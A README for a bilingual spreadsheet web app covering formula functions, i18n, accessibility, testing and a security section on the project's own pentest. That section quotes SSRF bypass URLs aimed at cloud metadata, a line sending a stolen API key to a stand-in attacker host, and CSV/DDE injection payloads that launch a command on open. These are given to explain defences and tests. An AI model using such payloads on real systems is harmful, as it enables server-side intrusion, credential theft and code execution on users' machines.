=INDEX(A2:A100,MATCH(150,C2:C100,0))        search column C, return column A — VLOOKUP cannot look leftwards
```

Giving `INDEX` a row number of 0 hands back the whole column (or 0 for the column, the whole row),
so another function can consume it: `=SUM(INDEX(A1:D6,0,3))`.

**`XLOOKUP` is the one to reach for now** — it names the search range and the answer range
separately, so the key needn't be leftmost and nothing breaks when a column is inserted between
them. Two further differences from `VLOOKUP` matter in practice: it matches **exactly by default**
(`VLOOKUP`'s default is approximate, which quietly returns a neighbouring row), and it takes what to
show when nothing matches, instead of leaving `#N/A` to be wrapped in `IFERROR` — which swallows
real errors along with the miss:

```
=XLOOKUP("Phuket",A2:A100,D2:D100,"not found")
=XLOOKUP(150,C2:C100,A2:A100,,-1)               nearest value at or below 150
```

The nearest-match modes compare rather than assume the column is sorted, which is the case
`VLOOKUP`'s approximate match gets silently wrong. Both arrays must be a single row or column of the
same length: Excel would spill a whole row out of a two-dimensional return array, and `XLOOKUP` here
does not, so that is refused rather than answered with the first cell.
(This line used to read "this engine has no spilling", which was true when it was written and stayed
there after [array formulas](#-formulas-that-answer-with-a-whole-table-array-formulas) shipped —
spilling exists now; `XLOOKUP` simply has not been wired to it.)

**An argument can be left out mid-formula** — `XLOOKUP(a,b,c,,-1)` skips `if_not_found` to reach the
match mode, the way Excel writes it. Before this the parser rejected the empty slot, which made
every argument after an optional one unreachable without typing a value nobody meant.

**`DATEDIF` answers "how long between these two dates"** in whole units: `"Y"`, `"M"` and `"D"`,
plus `"MD"`, `"YM"` and `"YD"` — the days ignoring months and years, the months ignoring years, and
the days ignoring years — which between them say "3 years, 2 months and 5 days" without three
separate subtractions. An end date before the start is `#NUM!`, as in Excel: it is a mistake in the
sheet, and a negative age would hide it.

**`SUMIFS` takes its arguments in the opposite order to `SUMIF`** — `SUMIF` puts the range being
summed *last*, `SUMIFS` puts it *first*. That's Excel's own inconsistency, kept because a formula
copied out of a real workbook has to behave the same way here:

```
=SUMIF(A2:A100,"Bangkok",C2:C100)                    one condition — sum range last
=SUMIFS(C2:C100,A2:A100,"Bangkok",B2:B100,"Q2")     several conditions — sum range first
```

Each criteria range has to be the same shape as the summed range, or the result is `#VALUE!`.
Lining them up from the top-left instead would test the wrong row for every cell past the shorter
range, and return a total that looks entirely reasonable and is wrong.

**Criteria typed into the palette are quoted for you** — `Q2` becomes `"Q2"` (not a reference to
the empty cell Q2), and `>100` becomes `">100"`, which is the only form that parses. For a
criteria that should come from a cell, write it Excel's way by concatenating: `">"&F1`, or
`""&F1` for the value alone.

**Criteria take wildcards** — `*` for any run of characters, `?` for exactly one, and `~` to escape
either when you mean the character itself (`"10~*20"` finds `10*20`). They work across the whole IF
family: `SUMIF`, `COUNTIF`, `AVERAGEIF`, `SUMIFS`, `COUNTIFS`, `AVERAGEIFS`. Matching ignores case
and covers the whole cell, so wrap a term in `*` on both sides for "contains".

**Checked against Excel, both directions.** A QA pass found five basic functions giving quiet wrong
answers, each now pinned by tests with Excel's own result beside it:
`ROUND` rounds a half away from zero (`ROUND(-2.5,0)` is -3, not -2) and rounds on the decimal digits
rather than a binary product (`ROUND(2.675,2)` is 2.68, `ROUNDDOWN(1.15,2)` is 1.15); `POWER`, `^` and
`SQRT` answer `#NUM!` where there is no real answer or it overflows, instead of NaN or Infinity in a
cell (`0^0` is `#NUM!` and `0^-1` is `#DIV/0!`, as in Excel); `AVERAGEIF` skips blank and text cells
the way `AVERAGEIFS` already did; and `LEFT`/`RIGHT` with a negative count or `MID` starting before the
first character is `#VALUE!` rather than a slice from the other end.

**Numbers can be written with an exponent** — `=1E3` is 1000, and `=2.5E-4` and `=6E+23` work too.
`E3` on its own is still a cell, because only a digit in front makes it an exponent, and `=1E309`,
past the largest number there is, is `#NUM!` rather than Infinity (#37). `1E3` used to be read as
the number 1 followed by the cell E3: a syntax error, or, inside a fill, a "cell" that got shifted,
so `1E3` quietly became `1E4`.

**A leading minus binds tighter than `^`, as in Excel** — `=-2^2` is 4, that is `(-2)^2`, while
`=0-2^2` is still -4, because that minus is a subtraction rather than a sign (#25). Both used to
give -4, so a formula copied out of Excel flipped its sign with nothing to say so.

**Not supported:** `MATCH` over a two-dimensional range — that returns `#N/A` rather than guessing a
position inside a block. `MROUND` is not in the engine. Arithmetic that overflows (`10^308*10`) still
shows as Infinity rather than Excel's `#NUM!`; only `^` and `POWER` were fixed. A chain of `^` still
works right to left: `=2^3^2` is 512, where Excel works left to right and gets 64.

Full support for arithmetic/comparison/concatenation operators (`+ - * / ^ = <> < > <= >= &`) and Excel-style
error values: `#DIV/0!`, `#VALUE!`, `#NAME?`, `#N/A`, `#REF!`, `#CIRCULAR!`.

Want to add a formula to the drag-and-drop palette? Add the real function in `functions.ts`, then add its entry
plus both languages' text in `formulaCatalog.ts` and `i18n/th.ts`/`en.ts`.

---

## 🌐 Bilingual UI (i18n)

No off-the-shelf i18n library (e.g. next-intl) is used, since the app is already entirely client-rendered and
doesn't need locale-based routing (`/en/...`) — instead it's a hand-written dictionary, with **TypeScript
enforcing translation quality**:

```mermaid
flowchart LR
    Types["i18n/types.ts<br/>interface Messages (the shared key set)"] -.implements.-> TH["i18n/th.ts"]
    Types -.implements.-> EN["i18n/en.ts"]
    TH --> Map["i18n/messages.ts<br/>Record&lt;Locale, Messages&gt;"]
    EN --> Map
    Map --> Hooks["i18n/index.ts<br/>useT() / useLocale() (client)<br/>getMessages() (server/store)"]
    Hooks --> Components["Every component"]
    Hooks --> Store["sheetStore actions<br/>(busy/error messages)"]
    Map --> Route["/api/ai/formula<br/>(imports messages.ts directly,<br/>no Zustand dependency)"]
```

- `th.ts`/`en.ts` must both implement the same `Messages` type — miss even one key's translation and **the
  build fails immediately** (rather than shipping a blank string discovered later in production).
- `messages.ts` (a plain map, no dependency on Zustand or the browser) is kept separate from `index.ts` (which
  has hooks tied to `localeStore`), so the **API route** (server-side code) can import it without pulling in
  `localStorage`/React.
- The AI assistant always understands both languages (the heuristic's keyword list mixes Thai and English in
  one list), but **its reply always follows whatever language the UI is set to** — the client sends the current
  `locale` with every question, and the app picks the matching Claude system prompt or heuristic explanation
  for that language.
- **The sample sheet follows the language too — but only while nobody has touched it.** It used to stay in
  Thai whatever the UI said, because swapping it meant the app replacing a sheet on its own. The sample is the
  one sheet that belongs to nobody, and the app already knows exactly when that stops being true (the same
  object-identity test that retires the sample banner), so the swap happens only then: switch language on an
  untouched sample and it changes; type one cell and it is yours, in whatever language you were reading.
  It waits for the autosave to be read first — otherwise a returning visitor's saved work could be
  overwritten by the sample on its way past — and stays out of undo. The built-in live-data sources follow
  the same rule: names and rows in the UI's language, a source someone renamed left as they named it.

---

## 🔐 Security — what was actually tested

This section exists because it is the line between "I asked an AI for an app" and building software.
Code that looks right and runs is not the same as code that is safe, and the only way to find out is
to attack it.

### The limits were written down first, then attacked

`SECURITY.md` recorded three holes in the live-data API as "accepted risks", which was too comfortable
an admission. All three were closed ([`b6438ba`](https://github.com/SuruchBoss/ExcelToGo/commit/b6438ba)),
then the pentest was run again — **against a running server, not by reading the code.**

### The second pass found a real one: an SSRF bypass the whole suite missed

The fetcher skips its SSRF guard for URLs pointing back at the app's own origin, and decided "points at
us" with `url.startsWith("/")`. But `//169.254.169.254/`, `/\169.254.169.254/` and `//evil.example/`
all start with a slash too, and `new URL(url, origin)` resolves them to a foreign host — **so the guard
was skipped for exactly the addresses it exists to block.**

Proven on a running server before fixing: `//169.254.169.254/` returned an HTTP response instead of a
refusal, and `//127.0.0.1:3000/api/sources` came back `401` from the app's own admin API — meaning the
server had connected to a loopback address the guard is meant to refuse. On a cloud host the first of
those is the **instance metadata endpoint**.

Closed in two layers: `executeSource` decides "same origin" from the *resolved* origin rather than a
leading slash, and `validate.ts` refuses a path whose second character is a slash or backslash before it
ever reaches the fetcher
([`8b92a7e`](https://github.com/SuruchBoss/ExcelToGo/commit/8b92a7e)).

**Confirmed by reverting** — all four cases fail on the old code and pass on the new. The tests were not
written to agree with whatever the code already did.

### "Why is the API key on the client?" — the objection, answered

A reader looked at the code and raised this, which is the right thing to ask. But two things look
alike here and are not the same:

| | Whose key | Who pays if it leaks |
|---|---|---|
| What people usually mean | The **operator's** key, shipped in the bundle (`NEXT_PUBLIC_...`) | The operator, for everyone on the internet |
| What this app does | The **visitor's own** key, typed into their own tab | Themselves, by their own choice |

No key of anyone's is embedded in this code. And **the intuitively "safer" option — posting the key
to our server — is worse for the person who owns it**: their secret would then sit in the memory of
a process they do not control, and possibly in the host's logs. There is nothing to leak here
because there is nothing here.

**The objection is right about one thing, and this is it:** a key in `sessionStorage` can be read by
anything running in this page. The realistic path is a supply-chain attack on one npm dependency,
not someone breaking into the host.

So there is now a **Content-Security-Policy** (`next.config.ts`) aimed at the step *after* the theft
— getting the key out. `connect-src` names the only three places this app ever talks to, so an
injected script cannot `fetch` a stolen key to an attacker's server, and `form-action` closes the
form route.

**`script-src` has no `'unsafe-inline'` any more**, and getting there took two attempts worth
writing down.

The first was **Subresource Integrity** (`experimental.sri`), which hashes every emitted bundle and
is appealing because it keeps pages prerendered. It does not work, and the browser said exactly
why: six scripts got an `integrity` attribute and **two inline scripts did not**, because React's
payload is part of the document. Chrome refused both and React threw #412 — the page never
hydrated. SRI hashes files; a script inside the HTML is not a file. The setting stays anyway, since
an integrity check on what a CDN serves costs nothing.

The second is what ships: [`src/proxy.ts`](src/proxy.ts) mints a nonce per request, puts it in the
policy and in the request headers, and Next stamps it onto its own inline scripts.
`'strict-dynamic'` comes with it, which is what makes the directive strict rather than decorative —
without it, a script injected with a `src` pointing at our own origin is still allowed by `'self'`.

**It costs prerendering, and the cost was measured before it was accepted.** A nonce must differ
per request, so no page can be built ahead of time; `await connection()` in the root layout says so
out loud. Time to first byte on the same machine, twelve requests each, median:

| | prerendered | per request |
|---|---|---|
| `/` | 5.3 ms | 14.6 ms |
| `/app` | 5.6 ms | 19.9 ms |

About ten to fifteen milliseconds of server time, against an LCP of 3.4 s on throttled mobile — it
does not show. The real cost is that the HTML can no longer be cached at a CDN edge, which would
matter for an audience spread across the world and does not matter for this.

**What it still does not do:** CSP cannot stop a top-level navigation
(`location = "https://evil.example/?k=" + key`). The `navigate-to` directive was dropped from the
spec. Narrowing the exits is not the same as fixing XSS, and a strict `script-src` makes the
injection itself much harder without making it impossible.

**The one deliberate exception: APIs a user connects from the browser.** To reach their own API, the page has to
be allowed to talk to its origin. Rather than opening `connect-src` for everyone, the origin of each source a user
saves (scheme, host and port only) goes into a first-party cookie, `etg-api-origins` (`Path=/`,
`SameSite=Strict`, `Secure`, one year), and `src/proxy.ts` reads it on every request and appends **only the
entries that pass validation** to that user's `connect-src`: exactly `https://host[:port]` or
`http://localhost[:port]` / `http://127.0.0.1[:port]`, parsed with `new URL()` and re-derived from `.origin` · no
wildcard, no `*`, no `https:` scheme source, no spaces, `;`, `'` or `,` · at most 20 · anything else dropped
silently · the fallback header in `next.config.ts` never reads the cookie. Someone who never adds a source gets the
same policy, character for character ([`apiOrigins.test.ts`](src/lib/apiOrigins.test.ts) pins the validator and
both policies; e2e checks the real header before and after).

**The trade-off, stated plainly:** a user who adds an API lets this page talk to that origin, and if a script were
ever injected, it could add an origin to the cookie itself, effective after a reload. This keeps the strict CSP
for everyone who does not use the feature; it does not fix XSS — which CSP never did (see top-level navigation above).

**Measured, not asserted.** A `fetch` from inside the page to an origin outside the policy is
refused — `Refused to connect … violates the following Content Security Policy directive` — while
`api.anthropic.com` raises no violation. And the app runs under the policy without tripping over it
once: charts draw, CSV and PDF downloads work.

All of that is a flow in `check:e2e` now — the header itself, the blocked exfiltration attempt, and
the app staying clean under its own policy — **proved by removing the header and watching the gate
fail**. A header is exactly the kind of thing that stays in the config long after it stopped being
served.

The key box says both halves out loud too: kept in this tab only, never through our server, and
**use a key you can revoke rather than your main one**, because a key held in a web page can be read
by anything running in that page.

### Testing the row-level security, in two halves

The migrations ship policies. Until now nothing proved they were still there, let alone that they
worked — and `alter table … enable row level security` is one line, without which a table answers
everyone while the policy file below it still reads as though it protects something.

**The half that runs everywhere** is `policies.test.ts`: it reads the migrations as text and checks
their shape. RLS enabled on both tables. Four verbs spelled out on `workbooks` rather than one
`for all`, so the list says what an anonymous visitor can do. `with check` on the update policy, and
the trigger that pins `user_id`, because a member who may edit must not be able to edit the row into
being theirs. The realtime policies asking the *same* question the workbook asks, rather than
keeping a second opinion that would drift. No policy that says `using (true)`, none granted to
`anon`, and every `security definer` helper with its `search_path` pinned. Proved by loosening one:
turning the channel's `using` into `true` fails three of them.

**The half that needs a database** is `npm run check:rls`, run deliberately against a project you
own, with two accounts. It creates a workbook as A and then tries, as B, everything that must fail:
read it, rename it, plant a row owned by A, invite a stranger, and join the live channel. Then A
shares it and the same script checks the door opened exactly as far as it should — B can read and
edit, and still cannot take ownership or delete. It finishes by trying to join the channel holding
nothing but the anon key, which is the thing that used to work.

### 323 security tests

| File | Tests | What it covers |
|---|---|---|
| `urlGuard.test.ts` | 31 | Loopback, private ranges, cloud metadata, IPv4 inside IPv6 (`::ffff:`, `::`, SIIT, NAT64, 6to4, Teredo), IPv6 documentation, link-local, multicast, non-http(s) schemes, hosts that don't resolve |
| `executeSource.test.ts` | 47 | The byte budget per refresh (including a real server's gzip inflating past it) and a timeout that covers the body, re-checking after a redirect, cutting redirect loops, the same-origin fast path, pagination, row bounds, the auth header kept to the source's own origin (cross-origin redirects, `https` → `http`, next-page links elsewhere) |
| `secretBox.test.ts` | 10 | AES-256-GCM, distinct ciphertexts, tamper detection, refusing to encrypt with no key rather than storing plain text |
| `rateLimiter.test.ts` | 10 | Refusing past the limit, per-key counting, a `Retry-After` that really shrinks, a bounded key map under a flood of forged addresses |
| `sourcesAuth.test.ts` | 9 | No token set means every request is refused, a blank token counts as unset, a token that is merely a prefix does not pass |
| `validate.test.ts` | 10 | Which URL shapes are accepted and which paths must be refused · and on the database side: a query that is not a read, a string that is not a connection string, a type and a scheme that disagree |
| `ai/formula/route.test.ts` | 7 | The server's key decides, and nothing else: no key means Anthropic is never reached and the local fallback still answers (not a 403), an old `NEXT_PUBLIC_DEMO_MODE` no longer hides a configured key, a missing question is a 400 |
| `byok.test.ts` | 12 | The visitor's own key: which shapes are accepted, masking (enough to recognise, not enough to reuse), gone when the tab closes, blocked storage must not break the panel |
| `demoSources.test.ts` | 15 | The sample feeds' list: app-relative URLs, no credential, read-only, and an id lookup that matches the whole id, not a prefix |
| `apiOrigins.test.ts` | 9 | Which origins the CSP takes from the cookie (https or localhost only; no wildcard, scheme source, path or credential; at most 20), the policy unchanged for someone who added nothing, exactly one origin added for someone who did, and no directive or wildcard injected through the cookie |
| `dataSources/browserSource.test.ts` | 10 | Fetching from the browser: the header only to its own origin, no next page followed off-origin, no cookies, plain http on the network refused before sending, the error codes it can tell apart, a token in the query flagged, a header value `fetch` cannot send refused |
| `csvInjection.test.ts` | 11 | Every DDE payload has to leave unable to run, from the export button and the crash rescue alike · negative numbers, Thai text and blanks must be untouched |
| `xlsxFormulaExport.test.ts` | 4 | An exported `.xlsx` holds only formulas the engine can read, whether the sheet came from a CSV or an `.xlsx` · one it cannot read goes out as text and comes back in as text · the cell in the app is unchanged |
| `dataSources/sqlGuard.test.ts` | 17 | A saved query must be one SELECT: a semicolon hidden in a comment, a string or a dollar-quote, `SELECT … INTO OUTFILE`, `pg_read_file`, and a column called `updated_at` that must not be mistaken for one |
| `server/dbGuard.test.ts` | 12 | Connection strings: both spellings of each kind, a password full of punctuation, unix sockets in both forms, private addresses refused, and an operator allow list that has to match the whole name |
| `server/executeDbSource.test.ts` | 4 | The order of the refusals: a query that fails the guard is rejected before DNS is even asked |
| `server/sourceRepo.test.ts` | 5 | What leaves the server: the connection string never does, only a description of it, and an unreadable one answers with dots rather than a guess |
| `usage.test.ts` | 15 | A counter that must not become an exfiltration channel: off by default, DNT/GPC honoured, automated browsers (webdriver/HeadlessChrome) not counted, once per page load, no retry on failure, and a payload whose only key is `event` |
| `api/usage/route.test.ts` | 24 | The side `curl` reaches: a name off the list is not recorded, a headless browser's user agent is not counted (read to decide, never kept), every extra field is dropped, a megabyte body is cut, 204 either way so a prober learns nothing, and an IP, user agent, referrer and cookie all sent and none reaching storage |
| `cloud/policies.test.ts` | 34 | The row-level security policies read as text: RLS switched on at all, four verbs spelled out, `with check` on update plus the trigger pinning the owner, the channel asking the same question the workbook asks, and nothing that says `using (true)` or is granted to `anon` |
| `errorReport.test.ts` | 20 | A crash reporter in an app that promises your file never leaves: off unless configured, a fixed set of fields, capped sizes, a query string never sent, and keys/tokens/emails/Thai text scrubbed out of the stack — with an ordinary English trace left readable |
| `cloud/liveMessage.test.ts` | 7 | Messages from other browsers on a live channel: a `row`/`col` that is not a usable index, a value that is not a string, one far larger than a cell, a kind that does not exist — all refused |

Run them on their own: `npx vitest run src/lib/server/ src/lib/dataSources/sqlGuard.test.ts src/lib/dataSources/browserSource.test.ts src/lib/apiOrigins.test.ts src/app/api/sources/validate.test.ts src/app/api/ai/formula/ src/lib/byok.test.ts src/lib/csvInjection.test.ts src/lib/xlsxFormulaExport.test.ts src/lib/cloud/ src/lib/errorReport.test.ts`

### OWASP Top 10, only the categories that actually apply here

| Category | What is in place |
|---|---|
| **A01 Broken Access Control** | Every `/api/sources` handler refuses when no token is configured (403) and refuses a wrong one (401) — two distinct states so an operator can tell which happened |
| **A02 Cryptographic Failures** | Source credentials are AES-256-GCM on disk and masked in every API response |
| **A04 Insecure Design** | **Server-side** live data is **off by default**; it takes `SOURCES_ADMIN_TOKEN` to switch on, and without it the UI does not show it and every route refuses · connecting an API from the browser has the server fetch nothing for anyone — the request leaves the user's own machine, and the CSP opens only the origins that user added |
| **A05 Security Misconfiguration** | No `SOURCES_ADMIN_TOKEN` means the API is closed, not open with no password |
| **A07 Authentication Failures** | The token is compared in full, not by prefix; accepted as a dedicated header or a bearer token |
| **A10 SSRF** | DNS is resolved and *every* returned address checked; redirects are followed and re-checked here rather than left to `fetch`; origins are compared after resolution |

### Anonymous testing

Every endpoint hit with no token: all six `/api/sources` handlers **fail closed**. `/api/ai/formula` is
the one deliberately open endpoint — the assistant is the app's own feature and requiring a login to use
it would be absurd — so it carries a ceiling of 20 requests per minute per IP with `Retry-After`.

That ceiling stops casual abuse; it does not stop a bill. An endpoint with no auth that can call a
model is the operator's money behind a button anyone can press, and **this route uses the server's
`ANTHROPIC_API_KEY` whenever one is set.** So the one billing control is not setting a key on a public
deployment — this project's public site is meant to run without one; the local keyword matcher answers instead, and visitors can
bring their own key, which goes from the browser straight to Anthropic and never through this route.
`NEXT_PUBLIC_DEMO_MODE=1` used to cut the model out even with a key set; it no longer does (#109), because the
public site is no longer a demo and a key someone sets should behave as it does self-hosted. The warning sits where
the key is configured, in [Step 3](#step-3--deploy-for-real) and in `.env.example`.

### Checked by hand but not pinned by a test — the difference matters

Three more things were verified during the pentest and passed, but **have no regression test**, so
nothing would warn you if a future change broke them:

- Metadata addresses written in decimal, octal or hex — the URL parser normalises those to a plain
  address before the guard sees them, so it simply sees `169.254.169.254`
- The `[id]` path segment cannot escape its directory
- An auth-header name containing CRLF is refused by `fetch` itself

### Known limits, deliberately left open

- **The rate-limit counters live in one process's memory.** Two instances count separately and a
  serverless cold start forgets everything — a guard against casual abuse, **not a billing control.**
  A real one needs shared storage, which this project deliberately does not have.
  (What actually controls the bill is not setting `ANTHROPIC_API_KEY` on a public deployment.)
- **CSV injection is neutralised** (this line used to say it wasn't). Measured before it was fixed: a sheet
  holding `+cmd|'/c calc'!A0` and `@SUM(1+1)*cmd|'/c calc'!A0` exported both of them live, while `=1+1` did
  not survive because this app's own engine had already evaluated it — **the dangerous prefixes are exactly
  the three the engine does not treat as a formula**, so "we compute formulas ourselves" was never a
  protection. It has its own security tests in `csvInjection.test.ts` (see
  [CSV in and out](#-csv-in-and-out)).
- **There are no user accounts**, so there is no per-user authorisation to test. `SOURCES_ADMIN_TOKEN`
  is an operator switch, not an account.

## 📈 Lighthouse

Measured against a local production build (`npm run build && npm run start`) with Lighthouse 12 on the
**mobile** preset — 4x CPU slowdown and simulated slow 4G, not a desktop run dressed up as one.

| Page | Performance | Accessibility | Best practices | SEO |
|---|---|---|---|---|
| Landing `/` | 90 | **100** | **100** | **100** |
| App `/app` | 84 | **100** | **100** | **100** |

`/` — FCP 1.0s · LCP 3.4s · TBT 160ms · **CLS 0** · Speed Index 1.0s
`/app` — FCP 1.0s · LCP 3.5s · TBT 310ms · **CLS 0** · Speed Index 1.0s

**Re-measured after the CSP nonce turned prerendering off**, rather than left standing from before
it. The scores moved by a few points in both directions, which is what a Lighthouse run does
between any two attempts; the +10–15 ms of server time the nonce costs does not show up against an
LCP of three and a half seconds. A number in a README that was true on an older build is the
failure this project has already had twice, so it was cheaper to run it again than to argue.

**Accessibility 100 on both pages**, which agrees with the [`check:a11y`](#-testing) gate that runs axe on
every PR — two different tools, same answer.

**Both of them were also wrong about the grid, and worth saying so.** Lighthouse 100 and axe clean at
four viewport/page combinations, while the sheet was to a screen reader an ordinary data table you
could not drive: no `role="grid"`, no `aria-selected`, no `scope` on the headers, every one of ten
thousand cells its own tab stop, and the browser's focus parked on A1 while `Ctrl+↓` moved the cursor
to A10 in silence. Neither tool was at fault — a `<table>` with `<th>` is a valid table, and they
were grading the thing they were shown. The grid now declares itself: `role="grid"` with
`aria-rowcount`/`aria-colcount`, `aria-rowindex` per row and `aria-colindex` per cell (the only way
"row 2,003 of 5,000" exists at all when forty rows are in the DOM), `scope` on both header
directions, `aria-selected` tracking the range, one roving tab stop instead of one per cell, and DOM
focus that follows the cursor — including the *moving* corner when Shift extends a selection, since
the anchor staying put is how a growing selection goes unannounced.

**Focus only ever announces where the cursor is, though.** Sort a column and the rows reorder under a
cursor that has not moved; paste and forty cells fill in below the fold; filter and half the sheet
disappears. Every one of those was silence. A polite live region now says what happened, with the
numbers that make it useful:

| You do this | It says |
|---|---|
| Sort column C | `Sorted column C ascending` |
| Filter column B | `Filtered column B: 4 of 9 rows shown` |
| Paste a block | `Pasted 3 rows by 2 columns at A1` |
| Select A2:B3 and press Delete | `Cleared A2:B3` |
| Merge, then split | `Merged A17:B17 into one cell` · `Split the merged cells in A17:B17` |
| Import a file | `File imported, 3 sheets` |
| Insert a chart | `Added a bar chart from B1:E10` |
| Change its kind, then delete it | `Changed to a line chart` · `Chart deleted, none left on this sheet` |
| Build a pivot | `Built pivot sheet "Pivot 1", 11 rows by 3 columns, and opened it` |
| Refresh it after the source moved | `Pivot refreshed from its source, 11 rows by 3 columns` |
| `Ctrl+Z` | `Undone` |

Charts and pivots earn their place here more than anything else on the list. A chart is drawn *over*
the grid rather than in it, so nothing a screen reader walks would ever mention that one had
appeared, changed shape or gone; and building a pivot creates a sheet that did not exist and
switches to it, which is the largest jump the app makes without the user navigating.

**A wrong number nearly shipped in that pivot message.** The first version read the dimensions off
the sheet the pivot is written onto — and that sheet is a blank 30×10 canvas with the result in its
corner, so an eleven-row summary announced itself as "30 rows by 10 columns". Caught by reading the
sentence the browser actually produced rather than trusting that the fields were named what they
sounded like. `renderPivotSheet` now returns the block's real size alongside the sheet.

Two regions, alternating on a sequence number, because a screen reader announces a live region when
its text **changes** — sorting the same column twice writes identical words, and one node would say
it once. Measured: the same sort three times in a row moves the text B → A → B.

Moving the cursor deliberately says nothing. Focus already announces the cell, and a grid that
repeats itself is worse than one that stays quiet. Verified the same way — arrows, `Ctrl+↓`,
`PageDown` and `Shift+↓` in sequence leave both regions untouched.

Two things are left out on purpose, and each is a decision rather than a gap. **Live data** re-polls
every few seconds, and a region that announces itself every five seconds is not an accessibility
feature, it is a fault. **The pie-series picker** is a native `<select>` whose options carry the
series names, and a select announces its own choice — a live region on top of that is the same
double-talk that keeps cursor movement out. Both omissions have a test of their own, so that "it
says nothing" cannot later be mistaken for "nobody got round to it".

**None of this has been heard by a real screen reader.** What is verified is that the right text
reaches the right region at the right moment, in both languages.

**Performance is not 90, and the only thing Lighthouse flags is `unused-javascript`, ~59KB (~300ms)** —
mostly Next's own framework chunks that aren't needed for the first frame. Going further means cutting into
the framework bundle itself, which isn't a trade worth making here. Written down rather than rounded up.

> These are localhost numbers, not Vercel's. The deployed site has a CDN and compression and should do
> better, but I can't verify that from here, so only what was actually measured is reported.

## 🧪 Testing

```bash
npm test      # 1638 cases across 105 files, via Vitest
```

Testing is focused on the **formula engine, sort logic, JSON-to-table conversion, pagination, rate-limit backoff, Excel templates and live-block placement** — pure functions with no React/DOM dependency, so
they run fast and give high confidence.

**But not one of those 1638 cases opens the app**, and nearly every bug this project found by hand lived in
the wiring *between* pieces that all passed their tests — the toolbar's "+ row" called `addRow`, which
announced nothing, while `insertRowAtSelection` next to it announced correctly (both tested) · the AI
assistant sent a range including its text header, because the context builder read raw `sheet.cells`
instead of computed values (both tested) · one new button pushed the language toggle 42px off the screen.

```bash
npm run check:e2e   # 23 flows in a real browser (needs a build)
```

Flows are picked by one rule: **would a unit test already catch it?** If yes it does not belong there. What
is left is the seams — type a formula and watch the value move on screen · export `.xlsx` through the real
button and import that file back through the real input, then check that the formula is still a formula and
the Thai is still Thai · walk the grid on the keyboard alone and watch focus follow the cursor · undo ·
whether a change away from the cursor is announced at all · an API connected from the browser, against a stand-in
API on another port, filling the sheet and refreshing on its own while every request to `/api/*` is recorded and
checked for the URL, the header and the data — with `connect-src` identical to the old one before the source and
exactly one origin longer after · an API without CORS getting the checklist for IT · and no page (`/`, `/app`,
`/guide`, both languages) printing the word "demo". Every flow also fails on an uncaught page error,
because a flow that passes every assertion while the console fills with exceptions React swallowed has not
passed.

**The AI assistant is in there too**, with `/api/ai/formula` stubbed. It is the only part of the app that
talks to a server and the part with the worst record — its unit tests mock the model, so they answer the way
whoever wrote them expected. Stubbing the route tests everything *around* the model, deterministically: the
range the panel actually sends (the shipped bug counted the header row into it), the returned formula
computing once inserted, and a `429` saying how many seconds to wait rather than collapsing into the generic
"could not connect" — the difference between an error a person can act on and one they cannot.

> Writing that flow, the first assertion reported the app sending `A1:A10` instead of `A1:A2`. **The fixture
> was wrong, not the app**: the sample sheet fills A–E for ten rows, so the range the app chose was right.
> Moving the numbers to the empty column F made it pass — and made the assertion mean something.

### The tests that break the engine on purpose

A test count says how many assertions exist. It does not say whether any of them would notice a bug,
and a suite can be both large and asleep. `npm run check:mutants` answers the other question: it
changes one character of the engine — a `<` to a `<=`, an `&&` to an `||`, a `*` to a `/` — runs the
suite, and checks it goes red. A change the suite runs green over is a **survivor**, and survivors
are the honest measure of a suite's reach.

Hand-written rather than Stryker, for the same reason the property tests carry their own PRNG: no
new dependency, the whole thing readable in one sitting, and the two decisions that matter — where a
mutation may land, and what counts as killed — made here rather than inherited. Comments, strings
and regular-expression literals are excluded, because a swapped `<` inside a doc comment changes
nothing and would count as a survivor: a lie in the direction that flatters the suite.

**The first run left six alive. Six tests were written from them, and each covers a specific way of
being wrong that nothing else was watching:**

| The change nothing noticed | What was actually missing |
|---|---|
| `COUNT`'s `&&` → `\|\|` | Every COUNT test used a range of numbers, where "not blank" and "is a number" agree. Text that is not a number was never counted against |
| `SEQUENCE`'s `r * w` → `r / w` | Every test asked for a single column, where the width never multiplies |
| `SEQUENCE`'s `* step` → `/ step` | Equivalent while the step is 1, which is what every test left it as |
| `COUNTIFS`'s `c < len` → `<=` | It read one cell past each row; `null` coerces to 0, which matches `"<10"`, so the count doubled quietly |
| `VLOOKUP`'s `key <= n` → `<` | An approximate match skipped an exact hit and returned the row above — a plausible neighbouring value |
| `"FALSE"` → `true` in `toBoolean` | Nothing asked what the *text* `"FALSE"` means |

An **equivalent** mutant changes the code without changing what it computes. Running SUMPRODUCT's
row loop one past the end reads a row that is not there, a missing cell contributes zero to a
product, and zero is then added to the total — the arithmetic cannot tell the difference. No test
can kill it, and writing one that tried would be asserting an implementation detail instead of a
result. One of those is marked **on the line above the code**, with its reason, and the gate stops
drawing that one swap on that one line (the line's other operators are still drawn):

```ts
// equivalent-mutant: "<" → "<=" — the extra cell is undefined, which the blank check below skips.
```

The reason sits next to the code, where a reviewer sees it — the same bargain `check:deps` makes for
an accepted advisory.

**The sample is tied to what each site is, not where it is.** It used to shuffle the whole list by
position, so one site gained or lost anywhere in the engine redrew all 32: the first commit of the
date work (#45) turned 31/32 into 22/32 by drawing a different sample, not by weakening a single
test. Each site is now ranked by a hash of its file, its line's text and its swap, so an edit only
moves the sites it touched. That fresh sample found seven real gaps, and each has its own test:
`NOW()` never checked for adding the time of day (#45's own new code), `PRODUCT` had no test at all,
`>=` between texts, a `"=apple"` criterion in COUNTIF, XLOOKUP's wildcard mode meeting an exact
match, SUMIFS with no condition at all, and inserting a row at the first row of a range — plus
`SEQUENCE(1,3)` spilling to the right. The rest were equivalent; ten are marked, each with its reason.

The pinned sample now kills 32 of 32. The
floor is 90%, a little under what the sample scores, because the job is to notice the suite getting
*worse* rather than to demand a number a legitimate refactor could cost.

The seed is pinned so a red cross means this commit rather than this draw. Looking for new gaps is
something you do on purpose: `SEED=13 MUTANTS=60 npm run check:mutants`.

### The tests with no formulas written in them

The other engine tests say *this formula gives this value*. They were written by the same person who
wrote the engine, from the same understanding of it — so they share its blind spots. A precedence bug
survives an example suite by being consistently wrong in the test and in the code. `property.test.ts`
names no formula at all: each test states something that must hold for *every* formula, then throws
thousands of generated ones at it.

The generator and the shrinker are about 80 hand-written lines rather than fast-check, for the same
reason the engine has no formula library. Every run is seeded and prints its seed on failure, so
`SEED=12345 npx vitest run property` replays it exactly.

**It found two real gaps on the first run — both in ground the engine's 147 example tests never covered:**

| What it found | What is actually true |
|---|---|
| `IF(TRUE(),1,2)` was a syntax error | Excel accepts `TRUE` and `TRUE()` alike; this engine accepted only the first. The generator writes `TRUE()` because Excel takes it — no example test ever had |
